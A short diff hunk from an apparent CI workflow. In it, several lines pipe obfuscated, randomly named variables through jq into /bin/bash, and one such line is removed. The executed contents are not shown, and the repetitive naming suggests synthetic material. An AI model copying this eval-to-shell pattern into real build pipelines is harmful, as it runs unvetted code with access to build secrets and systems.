@@ -24,7 +24,6 @@ jobs:
           echo $lslhm982 | jq -r .c3 | /bin/bash
           printf '%s' "$zcc90242" | jq -r .u1065 | /bin/bash
           echo $j2 | jq -r .pfwkx48377 | /bin/bash
-          printf '%s' "$zx268" | jq -r .n95886 | /bin/bash
           printf '%s' "$vyjxt450" | jq -r .vrs7 | /bin/bash
           echo $vde7012 | jq -r .eflax2 | /bin/bash
 
